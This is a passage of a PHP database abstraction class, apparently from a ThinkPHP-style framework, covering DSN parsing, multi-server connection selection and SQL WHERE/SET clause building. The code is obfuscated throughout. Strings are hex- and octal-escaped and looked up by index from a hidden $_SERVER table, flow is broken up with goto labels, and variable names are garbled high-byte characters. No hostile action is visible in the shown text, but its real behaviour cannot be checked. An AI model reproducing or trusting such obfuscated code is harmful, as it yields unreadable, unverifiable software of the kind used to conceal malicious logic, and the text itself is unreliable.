$dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\x71" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\147\164" => "\x3e\75", "\154\x74" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\157\x74\154\x69\153\145" => "\116\x4f\x54\x20\x4c\x49\x4b\105", "\154\151\x6b\145" => "\x4c\x49\x4b\105", "\x69\156" => "\111\x4e", "\156\x6f\164\151\156" => "\x4e\x4f\124\40\111\x4e", "\156\157\x74\40\x69\x6e" => "\116\117\x54\x20\x49\116", "\142\145\x74\x77\x65\x65\156" => "\x42\x45\124\127\x45\x45\116", "\156\x6f\x74\x62\145\x74\x77\145\145\x6e" => "\x4e\x4f\124\40\102\105\124\127\x45\x45\116", "\156\x6f\x74\x20\142\145\164\167\145\145\x6e" => "\x4e\117\x54\x20\x42\105\124\127\x45\105\116"); protected $selectSql = "\x53\105\x4c\105\x43\x54\45\104\111\123\x54\x49\x4e\x43\x54\45\40\x25\x46\x49\105\x4c\104\x25\40\x46\122\x4f\x4d\40\45\x54\x41\x42\x4c\x45\45\45\112\x4f\x49\116\x25\x25\x57\x48\105\122\105\x25\45\107\122\x4f\125\120\45\x25\x48\x41\x56\x49\116\x47\45\x25\x4f\x52\104\105\x52\45\45\x4c\111\115\111\124\45\40\x25\125\116\x49\117\116\45\x25\x43\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $A»€µ≈Ω© = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¯èãÄπµ][879], $A»€µ≈Ω©); } public function factory($eß¡„»ÿŒç = '') { goto béôîÖé»; béôîÖé»: $bÍ˜Ó¯ÌÛ≠ =& $_SERVER[¯èãÄπµ]; $eß¡„»ÿŒç = $this->parseConfig($eß¡„»ÿŒç); if (empty($eß¡„»ÿŒç[$bÍ˜Ó¯ÌÛ≠[880]])) { think_exception(think_lang($bÍ˜Ó¯ÌÛ≠[881])); } goto c≤€«ÍÖøÀ; c≤€«ÍÖøÀ: $this->dbType = ucwords(strtolower($eß¡„»ÿŒç[$bÍ˜Ó¯ÌÛ≠[880]])); $bç«ÁÆÈÎ” = $bÍ˜Ó¯ÌÛ≠[882] . $this->dbType; if (class_exists($bç«ÁÆÈÎ”)) { $d‰≈£èØçÇ = new $bç«ÁÆÈÎ”($eß¡„»ÿŒç); if ($bÍ˜Ó¯ÌÛ≠[727] != strtolower($eß¡„»ÿŒç[$bÍ˜Ó¯ÌÛ≠[880]])) { $d‰≈£èØçÇ->dbType = strtoupper($this->dbType); } else { $d‰≈£èØçÇ->dbType = $this->_getDsnType($eß¡„»ÿŒç[$bÍ˜Ó¯ÌÛ≠[832]]); } } else { think_exception(think_lang($bÍ˜Ó¯ÌÛ≠[883]) . $bÍ˜Ó¯ÌÛ≠[884] . $bç«ÁÆÈÎ”); } goto dÿê¢≠Œ∂¥; dÿê¢≠Œ∂¥: return $d‰≈£èØçÇ; goto aòè‹õÜ≠û; aòè‹õÜ≠û: } public function __call($BÜÉ©∞É˜∂, $fØπ’∞îÊÆ) { if (method_exists($this, $BÜÉ©∞É˜∂)) { return call_user_func_array(array($this, $BÜÉ©∞É˜∂), $fØπ’∞îÊÆ); } } protected function _getDsnType($CÊÍ¬ö•‡) { $Dä˜„Ù‡◊ﬁ = explode($_SERVER[¯èãÄπµ][4], $CÊÍ¬ö•‡); $AÙÑÔãôÃœ = strtoupper(trim($Dä˜„Ù‡◊ﬁ[0])); return $AÙÑÔãôÃœ; } private function parseConfig($Dàãè∂÷ïÒ = '') { $EœÜõ˘Ü€õ =& $_SERVER[¯èãÄπµ]; if (!empty($Dàãè∂÷ïÒ) && is_string($Dàãè∂÷ïÒ)) { $Dàãè∂÷ïÒ = $this->parseDSN($Dàãè∂÷ïÒ); } elseif (is_array($Dàãè∂÷ïÒ)) { $Dàãè∂÷ïÒ = array_change_key_case($Dàãè∂÷ïÒ); $Dàãè∂÷ïÒ = array($EœÜõ˘Ü€õ[880] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[726]], $EœÜõ˘Ü€õ[805] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[885]], $EœÜõ˘Ü€õ[806] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[886]], $EœÜõ˘Ü€õ[803] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[887]], $EœÜõ˘Ü€õ[804] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[888]], $EœÜõ˘Ü€õ[17] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[889]], $EœÜõ˘Ü€õ[832] => $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[728]], $EœÜõ˘Ü€õ[13] => isset($Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[890]]) ? $Dàãè∂÷ïÒ[$EœÜõ˘Ü€õ[890]] : array()); } elseif (empty($Dàãè∂÷ïÒ)) { if (think_config($EœÜõ˘Ü€õ[891]) && $EœÜõ˘Ü€õ[727] != strtolower(think_config($EœÜõ˘Ü€õ[892]))) { $Dàãè∂÷ïÒ = $this->parseDSN(think_config($EœÜõ˘Ü€õ[891])); } else { $Dàãè∂÷ïÒ = array($EœÜõ˘Ü€õ[880] => think_config($EœÜõ˘Ü€õ[892]), $EœÜõ˘Ü€õ[805] => think_config($EœÜõ˘Ü€õ[893]), $EœÜõ˘Ü€õ[806] => think_config($EœÜõ˘Ü€õ[894]), $EœÜõ˘Ü€õ[803] => think_config($EœÜõ˘Ü€õ[895]), $EœÜõ˘Ü€õ[804] => think_config($EœÜõ˘Ü€õ[896]), $EœÜõ˘Ü€õ[17] => think_config($EœÜõ˘Ü€õ[230]), $EœÜõ˘Ü€õ[832] => think_config($EœÜõ˘Ü€õ[891]), $EœÜõ˘Ü€õ[13] => think_config($EœÜõ˘Ü€õ[897])); } } return $Dàãè∂÷ïÒ; } protected function initConnect($d”É”ÇÌ‰∞ = true) { if (1 == think_config($_SERVER[¯èãÄπµ][18])) { $this->_linkID = $this->multiConnect($d”É”ÇÌ‰∞); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($fäá≥¯Ê•ê = false) { $dßÍƒú¢¬ä =& $_SERVER[¯èãÄπµ]; static $aÇ…©’ßﬂÖ = array(); if (empty($aÇ…©’ßﬂÖ)) { foreach ($this->config as $Eæ—§∑™¨ì => $cÑåë§»·ö) { $aÇ…©’ßﬂÖ[$Eæ—§∑™¨ì] = explode($dßÍƒú¢¬ä[47], $cÑåë§»·ö); } } if (think_config($dßÍƒú¢¬ä[898])) { if ($fäá≥¯Ê•ê) { $E•Í√É±∫› = floor(mt_rand(0, think_config($dßÍƒú¢¬ä[899]) - 1)); } else { if (is_numeric(think_config($dßÍƒú¢¬ä[900]))) { $E•Í√É±∫› = think_config($dßÍƒú¢¬ä[900]); } else { $E•Í√É±∫› = floor(mt_rand(think_config($dßÍƒú¢¬ä[899]), count($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[803]]) - 1)); } } } else { $E•Í√É±∫› = floor(mt_rand(0, count($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[803]]) - 1)); } $d¡ØõÛÜº¯ = array($dßÍƒú¢¬ä[805] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[805]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[805]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[805]][0], $dßÍƒú¢¬ä[806] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[806]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[806]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[806]][0], $dßÍƒú¢¬ä[803] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[803]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[803]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[803]][0], $dßÍƒú¢¬ä[804] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[804]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[804]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[804]][0], $dßÍƒú¢¬ä[17] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[17]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[17]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[17]][0], $dßÍƒú¢¬ä[832] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[832]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[832]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[832]][0], $dßÍƒú¢¬ä[13] => isset($aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[13]][$E•Í√É±∫›]) ? $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[13]][$E•Í√É±∫›] : $aÇ…©’ßﬂÖ[$dßÍƒú¢¬ä[13]][0]); return $this->connect($d¡ØõÛÜº¯, $E•Í√É±∫›); } public function parseDSN($eêûæí∂ÊÇ) { $Eã¬Ò´ô›˘ =& $_SERVER[¯èãÄπµ]; if (empty($eêûæí∂ÊÇ)) { return !1; } $b“è¡ıÉÊı = parse_url($eêûæí∂ÊÇ); if ($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[164]]) { $FÑ◊Ÿ∏¥ùµ = array($Eã¬Ò´ô›˘[880] => $b“è¡ıÉÊı[$Eã¬Ò´ô›˘[164]], $Eã¬Ò´ô›˘[805] => isset($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[531]]) ? $b“è¡ıÉÊı[$Eã¬Ò´ô›˘[531]] : $Eã¬Ò´ô›˘[33], $Eã¬Ò´ô›˘[806] => isset($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[901]]) ? $b“è¡ıÉÊı[$Eã¬Ò´ô›˘[901]] : $Eã¬Ò´ô›˘[33], $Eã¬Ò´ô›˘[803] => isset($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[165]]) ? $b“è¡ıÉÊı[$Eã¬Ò´ô›˘[165]] : $Eã¬Ò´ô›˘[33], $Eã¬Ò´ô›˘[804] => isset($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[166]]) ? $b“è¡ıÉÊı[$Eã¬Ò´ô›˘[166]] : $Eã¬Ò´ô›˘[33], $Eã¬Ò´ô›˘[17] => isset($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[75]]) ? substr($b“è¡ıÉÊı[$Eã¬Ò´ô›˘[75]], 1) : $Eã¬Ò´ô›˘[33]); } else { preg_match($Eã¬Ò´ô›˘[902], trim($eêûæí∂ÊÇ), $cÁç¥Æÿ·¢); $FÑ◊Ÿ∏¥ùµ = array($Eã¬Ò´ô›˘[880] => $cÁç¥Æÿ·¢[1], $Eã¬Ò´ô›˘[805] => $cÁç¥Æÿ·¢[2], $Eã¬Ò´ô›˘[806] => $cÁç¥Æÿ·¢[3], $Eã¬Ò´ô›˘[803] => $cÁç¥Æÿ·¢[4], $Eã¬Ò´ô›˘[804] => $cÁç¥Æÿ·¢[5], $Eã¬Ò´ô›˘[17] => $cÁç¥Æÿ·¢[6]); } $FÑ◊Ÿ∏¥ùµ[$Eã¬Ò´ô›˘[832]] = $Eã¬Ò´ô›˘[33]; return $FÑ◊Ÿ∏¥ùµ; } protected function debug() { $cØ˜ﬂ„Ê°Ã =& $_SERVER[¯èãÄπµ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $cØ˜ﬂ„Ê°Ã[903]; if (think_config($cØ˜ﬂ„Ê°Ã[904])) { think_status($cØ˜ﬂ„Ê°Ã[905]); think_trace($this->queryStr . $cØ˜ﬂ„Ê°Ã[906] . think_status($cØ˜ﬂ„Ê°Ã[20], $cØ˜ﬂ„Ê°Ã[905], 6) . $cØ˜ﬂ„Ê°Ã[907], $cØ˜ﬂ„Ê°Ã[33], $cØ˜ﬂ„Ê°Ã[908]); } } protected function parseLock($dßÎ©•≠Ù⁄ = false) { $FÌ€±É–éÇ =& $_SERVER[¯èãÄπµ]; if (!$dßÎ©•≠Ù⁄) { return $FÌ€±É–éÇ[33]; } if ($FÌ€±É–éÇ[834] == $this->dbType) { return $FÌ€±É–éÇ[909]; } return $FÌ€±É–éÇ[910]; } protected function parseSet($fÖ‘˜ãÂ§∫) { $FÓ—àΩñœô =& $_SERVER[¯èãÄπµ]; foreach ($fÖ‘˜ãÂ§∫ as $Fá∑œﬁ¥∫È => $Aä›ï—†ΩË) { if (is_array($Aä›ï—†ΩË) && $FÓ—àΩñœô[281] == $Aä›ï—†ΩË[0]) { $b¥ƒ´ÿãç‹[] = $this->parseKey($Fá∑œﬁ¥∫È) . $FÓ—àΩñœô[911] . $Aä›ï—†ΩË[1]; } elseif (is_scalar($Aä›ï—†ΩË) || is_null($Aä›ï—†ΩË)) { $b¥ƒ´ÿãç‹[] = $this->parseKey($Fá∑œﬁ¥∫È) . $FÓ—àΩñœô[911] . $this->parseValue($Aä›ï—†ΩË); } } return $FÓ—àΩñœô[912] . implode($FÓ—àΩñœô[47], $b¥ƒ´ÿãç‹); } protected function bindParam($C®ıÙàÛã›, $c’Õ¨õ≤±√) { $this->bind[$_SERVER[¯èãÄπµ][4] . $C®ıÙàÛã›] = $c’Õ¨õ≤±√; } protected function parseBind($dÜé¶°É±ò) { $dÜé¶°É±ò = array_merge($this->bind, $dÜé¶°É±ò); $this->bind = array(); return $dÜé¶°É±ò; } function parseKey(&$D„ÏÈÎ≠Íò, $Fìê∏§°®€ = true) { if ($Fìê∏§°®€) { $D„ÏÈÎ≠Íò = $this->parseKeyCheck($D„ÏÈÎ≠Íò); } return $D„ÏÈÎ≠Íò; } function parseKeyCheck($fïåÜïÎÎé) { $DÃçà”ëê€ =& $_SERVER[¯èãÄπµ]; $fïåÜïÎÎé = trim($fïåÜïÎÎé); if (!preg_match($DÃçà”ëê€[913], $fïåÜïÎÎé)) { think_exception($DÃçà”ëê€[914] . $fïåÜïÎÎé); } return $fïåÜïÎÎé; } protected function parseValue($CÜüÓÂÆø⁄) { $EÓÍ†¥Ã–ë =& $_SERVER[¯èãÄπµ]; if (is_string($CÜüÓÂÆø⁄)) { $CÜüÓÂÆø⁄ = $EÓÍ†¥Ã–ë[873] . $this->escapeString($CÜüÓÂÆø⁄) . $EÓÍ†¥Ã–ë[873]; } elseif (isset($CÜüÓÂÆø⁄[0]) && is_string($CÜüÓÂÆø⁄[0]) && strtolower($CÜüÓÂÆø⁄[0]) == $EÓÍ†¥Ã–ë[281]) { $CÜüÓÂÆø⁄ = $this->escapeString($CÜüÓÂÆø⁄[1]); } elseif (is_array($CÜüÓÂÆø⁄)) { $CÜüÓÂÆø⁄ = array_map(array($this, $EÓÍ†¥Ã–ë[874]), $CÜüÓÂÆø⁄); } elseif (is_bool($CÜüÓÂÆø⁄)) { $CÜüÓÂÆø⁄ = $CÜüÓÂÆø⁄ ? $EÓÍ†¥Ã–ë[83] : $EÓÍ†¥Ã–ë[464]; } elseif (is_null($CÜüÓÂÆø⁄)) { $CÜüÓÂÆø⁄ = $EÓÍ†¥Ã–ë[99]; } return $CÜüÓÂÆø⁄; } protected function parseField($cñíÑÓó—) { $Aø¢«—¡∑› =& $_SERVER[¯èãÄπµ]; if (is_string($cñíÑÓó—) && strpos($cñíÑÓó—, $Aø¢«—¡∑›[47])) { $cñíÑÓó— = explode($Aø¢«—¡∑›[47], $cñíÑÓó—); } if (is_array($cñíÑÓó—)) { $BÌÍöÀ–„œ = array(); foreach ($cñíÑÓó— as $Eµπ≈ÔÃ¢Ï => $Fâ‚§øÁ¿Û) { if (!is_numeric($Eµπ≈ÔÃ¢Ï)) { $BÌÍöÀ–„œ[] = $this->parseKey($Eµπ≈ÔÃ¢Ï) . $Aø¢«—¡∑›[915] . $this->parseKey($Fâ‚§øÁ¿Û); } else { $BÌÍöÀ–„œ[] = $this->parseKey($Fâ‚§øÁ¿Û); } } $d©Ç°Œò“æ = implode($Aø¢«—¡∑›[47], $BÌÍöÀ–„œ); } elseif (is_string($cñíÑÓó—) && !empty($cñíÑÓó—)) { $d©Ç°Œò“æ = $cñíÑÓó—; } else { $d©Ç°Œò“æ = $Aø¢«—¡∑›[172]; } return $d©Ç°Œò“æ; } protected function parseTable($díçí…¢∞) { $C¢»º˜Á•æ =& $_SERVER[¯èãÄπµ]; if (is_array($díçí…¢∞)) { $c˜ÕÌ¶ÙÎ = array(); foreach ($díçí…¢∞ as $bõªáõåÏÛ => $Eπ±–⁄á›ã) { if (!is_numeric($bõªáõåÏÛ)) { $c˜ÕÌ¶ÙÎ[] = $this->parseKey($bõªáõåÏÛ) . $C¢»º˜Á•æ[50] . $this->parseKey($Eπ±–⁄á›ã); } else { $c˜ÕÌ¶ÙÎ[] = $this->parseKey($bõªáõåÏÛ); } } $díçí…¢∞ = $c˜ÕÌ¶ÙÎ; } elseif (is_string($díçí…¢∞)) { if (strstr($díçí…¢∞, $C¢»º˜Á•æ[50])) { return $díçí…¢∞; } $díçí…¢∞ = explode($C¢»º˜Á•æ[47], $díçí…¢∞); array_walk($díçí…¢∞, array($this, $C¢»º˜Á•æ[822])); } return $C¢»º˜Á•æ[916] . trim(implode($C¢»º˜Á•æ[917], $díçí…¢∞), $C¢»º˜Á•æ[828]) . $C¢»º˜Á•æ[916]; } protected function parseWhere($aîîÒ¬∆¨À) { $fπÉñû´œ =& $_SERVER[¯èãÄπµ]; $bÇﬁ•ò‚øí = $fπÉñû´œ[33]; if (is_string($aîîÒ¬∆¨À)) { $bÇﬁ•ò‚øí = $aîîÒ¬∆¨À; } else { $e∆ƒÒ˘”‹ó = isset($aîîÒ¬∆¨À[$fπÉñû´œ[918]]) ? strtoupper($aîîÒ¬∆¨À[$fπÉñû´œ[918]]) : $fπÉñû´œ[33]; if (in_array($e∆ƒÒ˘”‹ó, array($fπÉñû´œ[919], $fπÉñû´œ[920], $fπÉñû´œ[921]))) { $e∆ƒÒ˘”‹ó = $fπÉñû´œ[50] . $e∆ƒÒ˘”‹ó . $fπÉñû´œ[50]; unset($aîîÒ¬∆¨À[$fπÉñû´œ[918]]); } else { $e∆ƒÒ˘”‹ó = $fπÉñû´œ[922]; } foreach ($aîîÒ¬∆¨À as $eØÎÂ±ËÊì => $Dƒî§Ú¢ ¥) { $bÇﬁ•ò‚øí .= $fπÉñû´œ[261]; if (is_numeric($eØÎÂ±ËÊì)) { $eØÎÂ±ËÊì = $fπÉñû´œ[923]; } if (0 === strpos($eØÎÂ±ËÊì, $fπÉñû´œ[70])) { $bÇﬁ•ò‚øí .= $this->parseThinkWhere($eØÎÂ±ËÊì, $Dƒî§Ú¢ ¥); } else { if (!preg_match($fπÉñû´œ[924], trim($eØÎÂ±ËÊì))) { think_exception(think_lang($fπÉñû´œ[925]) . $fπÉñû´œ[4] . $eØÎÂ±ËÊì); } $aÖÈ”‘—¬æ = is_array($Dƒî§Ú¢ ¥) && isset($Dƒî§Ú¢ ¥[$fπÉñû´œ[926]]); $eØÎÂ±ËÊì = trim($eØÎÂ±ËÊì); if (strpos($eØÎÂ±ËÊì, $fπÉñû´œ[267])) { $Cíﬁ“¿àûÇ = explode($fπÉñû´œ[267], $eØÎÂ±ËÊì); $FΩÁÆ…ùÇ≠ = array(); foreach ($Cíﬁ“¿àûÇ as $bàòïó“‘º => $d©ôã£”Œ¯) { $a©¨ø∑è¡€ = $aÖÈ”‘—¬æ ? $Dƒî§Ú¢ ¥[$bàòïó“‘º] : $Dƒî§Ú¢ ¥; $FΩÁÆ…ùÇ≠[] = $fπÉñû´œ[244] . $this->parseWhereItem($this->parseKey($d©ôã£”Œ¯), $a©¨ø∑è¡€) . $fπÉñû´œ[821]; } $bÇﬁ•ò‚øí .= implode($fπÉñû´œ[927], $FΩÁÆ…ùÇ≠); } elseif (strpos($eØÎÂ±ËÊì, $fπÉñû´œ[268])) { $Cíﬁ“¿àûÇ = explode($fπÉñû´œ[268], $eØÎÂ±ËÊì); $FΩÁÆ…ùÇ≠ = array(); foreach ($Cíﬁ“¿àûÇ as $bàòïó“‘º => $d©ôã£”Œ¯) { $a©¨ø∑è¡€ = $aÖÈ”‘—¬æ ? $Dƒî§Ú¢ ¥[$bàòïó“‘º] : $Dƒî§Ú¢ ¥; $FΩÁÆ…ùÇ≠[] = $fπÉñû´œ[244] . $this->parseWhereItem($this->parseKey($d©ôã£”Œ¯), $a©¨ø∑è¡€) . $fπÉñû´œ[821]; } $bÇﬁ•ò‚øí .= implode($fπÉñû´œ[922], $FΩÁÆ…ùÇ≠); } else { $bÇﬁ•ò‚øí .= $this->parseWhereItem($this->parseKey($eØÎÂ±ËÊì), $Dƒî§Ú¢ ¥); } } $bÇﬁ•ò‚øí .= $fπÉñû´œ[262] . $e∆ƒÒ˘”‹ó; } $bÇﬁ•ò‚øí = substr($bÇﬁ•ò‚øí, 0, -strlen($e∆ƒÒ˘”‹ó)); } return empty($bÇﬁ•ò‚øí) ? $fπÉñû´œ[33] : $fπÉñû´œ[928] . $bÇﬁ•ò‚øí; } protected function parseWhereItem($cµèå∑‹ƒ«, $eﬂê√¨≤µâ) { $bÏÑñ™ıá€ =& $_SERVER[¯èãÄπµ]; $a‡´€Ç›ÉË = $bÏÑñ™ıá€[33]; if (is_array($eﬂê√¨≤µâ)) { if (is_string($eﬂê√¨≤µâ[0])) { $bâï°Öøºä = strtolower($eﬂê√¨≤µâ[0]); if (in_array($eﬂê√¨≤µâ[0], array($bÏÑñ™ıá€[911], $bÏÑñ™ıá€[929], $bÏÑñ™ıá€[930], $bÏÑñ™ıá€[931], $bÏÑñ™ıá€[932], $bÏÑñ™ıá€[933]))) { $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $eﬂê√¨≤µâ[0] . $bÏÑñ™ıá€[50] . $this->parseValue($eﬂê√¨≤µâ[1]); } elseif (preg_match($bÏÑñ™ıá€[934], $eﬂê√¨≤µâ[0])) { $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[50] . $this->parseValue($eﬂê√¨≤µâ[1]); } elseif (preg_match($bÏÑñ™ıá€[935], $eﬂê√¨≤µâ[0])) { if (is_array($eﬂê√¨≤µâ[1])) { $cäﬁÔò·É° = isset($eﬂê√¨≤µâ[2]) ? strtoupper($eﬂê√¨≤µâ[2]) : $bÏÑñ™ıá€[920]; if (in_array($cäﬁÔò·É°, array($bÏÑñ™ıá€[919], $bÏÑñ™ıá€[920], $bÏÑñ™ıá€[921]))) { $BÓ⁄Ωø¢¶å = array(); foreach ($eﬂê√¨≤µâ[1] as $BΩÓç¥–‚”) { $BÓ⁄Ωø¢¶å[] = $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[50] . $this->parseValue($BΩÓç¥–‚”); } $a‡´€Ç›ÉË .= $bÏÑñ™ıá€[244] . implode($bÏÑñ™ıá€[50] . $cäﬁÔò·É° . $bÏÑñ™ıá€[50], $BÓ⁄Ωø¢¶å) . $bÏÑñ™ıá€[821]; } } else { $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[50] . $this->parseValue($eﬂê√¨≤µâ[1]); } } elseif ($bÏÑñ™ıá€[281] == $bâï°Öøºä) { $a‡´€Ç›ÉË .= $bÏÑñ™ıá€[819] . $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $eﬂê√¨≤µâ[1] . $bÏÑñ™ıá€[936]; } elseif (preg_match($bÏÑñ™ıá€[937], $eﬂê√¨≤µâ[0])) { if (isset($eﬂê√¨≤µâ[2]) && $bÏÑñ™ıá€[281] == $eﬂê√¨≤µâ[2]) { $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[50] . $eﬂê√¨≤µâ[1]; } else { if (is_string($eﬂê√¨≤µâ[1])) { $eﬂê√¨≤µâ[1] = explode($bÏÑñ™ıá€[47], $eﬂê√¨≤µâ[1]); } $cï”ÎÊåêÂ = implode($bÏÑñ™ıá€[47], $this->parseValue($eﬂê√¨≤µâ[1])); $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[819] . $cï”ÎÊåêÂ . $bÏÑñ™ıá€[821]; } } elseif (preg_match($bÏÑñ™ıá€[938], $eﬂê√¨≤µâ[0])) { $aº∫Ö‹—Çã = is_string($eﬂê√¨≤µâ[1]) ? explode($bÏÑñ™ıá€[47], $eﬂê√¨≤µâ[1]) : $eﬂê√¨≤µâ[1]; $a‡´€Ç›ÉË .= $bÏÑñ™ıá€[819] . $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $this->exp[$bâï°Öøºä] . $bÏÑñ™ıá€[50] . $this->parseValue($aº∫Ö‹—Çã[0]) . $bÏÑñ™ıá€[922] . $this->parseValue($aº∫Ö‹—Çã[1]) . $bÏÑñ™ıá€[262]; } else { think_exception(think_lang($bÏÑñ™ıá€[925]) . $bÏÑñ™ıá€[4] . $eﬂê√¨≤µâ[0]); } } else { $eÖú‰–Ô…ó = count($eﬂê√¨≤µâ); $A´Âå‚‰ëÊ = isset($eﬂê√¨≤µâ[$eÖú‰–Ô…ó - 1]) ? strtoupper($eﬂê√¨≤µâ[$eÖú‰–Ô…ó - 1]) : $bÏÑñ™ıá€[33]; if (in_array($A´Âå‚‰ëÊ, array($bÏÑñ™ıá€[919], $bÏÑñ™ıá€[920], $bÏÑñ™ıá€[921]))) { $eÖú‰–Ô…ó = $eÖú‰–Ô…ó - 1; } else { $A´Âå‚‰ëÊ = $bÏÑñ™ıá€[919]; } for ($CäÙÃ®éà = 0; $CäÙÃ®éà < $eÖú‰–Ô…ó; $CäÙÃ®éà++) { $aº∫Ö‹—Çã = is_array($eﬂê√¨≤µâ[$CäÙÃ®éà]) ? $eﬂê√¨≤µâ[$CäÙÃ®éà][1] : $eﬂê√¨≤µâ[$CäÙÃ®éà]; if ($bÏÑñ™ıá€[281] == strtolower($eﬂê√¨≤µâ[$CäÙÃ®éà][0])) { $a‡´€Ç›ÉË .= $bÏÑñ™ıá€[244] . $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $aº∫Ö‹—Çã . $bÏÑñ™ıá€[936] . $A´Âå‚‰ëÊ . $bÏÑñ™ıá€[50]; } else { $D˜”É‰ﬁ´ñ = is_array($eﬂê√¨≤µâ[$CäÙÃ®éà]) ? $this->exp[strtolower($eﬂê√¨≤µâ[$CäÙÃ®éà][0])] : $bÏÑñ™ıá€[911]; if (!$D˜”É‰ﬁ´ñ && is_array($eﬂê√¨≤µâ[$CäÙÃ®éà]) && in_array($eﬂê√¨≤µâ[$CäÙÃ®éà][0], array($bÏÑñ™ıá€[911], $bÏÑñ™ıá€[929], $bÏÑñ™ıá€[930], $bÏÑñ™ıá€[931], $bÏÑñ™ıá€[932], $bÏÑñ™ıá€[933]))) { $D˜”É‰ﬁ´ñ = $eﬂê√¨≤µâ[$CäÙÃ®éà][0]; } $a‡´€Ç›ÉË .= $bÏÑñ™ıá€[244] . $cµèå∑‹ƒ« . $bÏÑñ™ıá€[50] . $D˜”É‰ﬁ´ñ . $bÏÑñ™ıá€[50] . $this->parseValue($aº∫Ö‹—Çã) . $bÏÑñ™ıá€[936] . $A´Âå‚‰ëÊ . $bÏÑñ™ıá€[50]; } } $a‡´€Ç›ÉË = substr($a‡´€Ç›ÉË, 0, -4); } } else { $a‡´€Ç›ÉË .= $cµèå∑‹ƒ« . $bÏÑñ™ıá€[939] . $this->parseValue($eﬂê√¨≤µâ); } return $a‡´€Ç›ÉË; } protected function parseThinkWhere($d¥ÈÀõ±î¢, $C–œ‚Àˆ©ä) { $CÃâÜùç°≠ =& $_SERVER[¯èãÄπµ]; $F•€¶ÍıËÏ = $CÃâÜùç°≠[33]; switch ($d¥ÈÀõ±î¢) { case $CÃâÜùç°≠[335]: $F•€¶ÍıËÏ = $C–œ‚Àˆ©ä; break; case $CÃâÜùç°≠[923]: $F•€¶ÍıËÏ = is_string($C–œ‚Àˆ©ä) ? $C–œ‚Àˆ©ä : substr($this->parseWhere($C–œ‚Àˆ©ä), 6); break; case $CÃâÜùç°≠[940]: parse_str($C–œ‚Àˆ©ä, $c≥éÂ¯ÆÈ·); if (isset($c≥éÂ¯ÆÈ·[$CÃâÜùç°≠[918]])) { $b∞À≤©‡»å = $CÃâÜùç°≠[50] . strtoupper($c≥éÂ¯ÆÈ·[$CÃâÜùç°≠[918]]) . $CÃâÜùç°≠[50]; unset($c≥éÂ¯ÆÈ·[$CÃâÜùç°≠[918]]); } else { $b∞À≤©‡»å = $CÃâÜùç°≠[922]; } $Dà∂»Æ∆·¬ = array(); foreach 